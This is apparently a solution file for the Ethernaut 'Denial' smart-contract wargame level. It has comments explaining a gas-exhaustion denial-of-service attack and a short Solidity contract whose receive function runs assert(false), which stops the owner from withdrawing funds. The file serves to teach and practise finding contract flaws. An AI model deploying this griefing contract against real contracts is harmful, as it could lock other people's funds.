// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x2cD9ba10E24f978CF3508c37459AE13d5a0bF0BC

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./SafeMath.sol";

// solution

// basically to deny the owner from withdrawing the funds, you need to consume all the gas
// in the call(), to cause the function to be out of gas preventing it to execute the remaining instructions
// thats possible because no gas amount is specified in the call() function, so we can create
// a contract with a fallback function that consumes all the gas when calling it

// we use assert(false) in the fallback because that function compiles to 0xfe, 
// which is an invalid opcode, using up all remaining gas, and reverting all changes

// set this contract address as the withdrawal partner and submit

// https://media.consensys.net/when-to-use-revert-assert-and-require-in-solidity-61fb2c0e5a57

contract HackDenial {
    receive() external payable {
        assert(false);
    }
}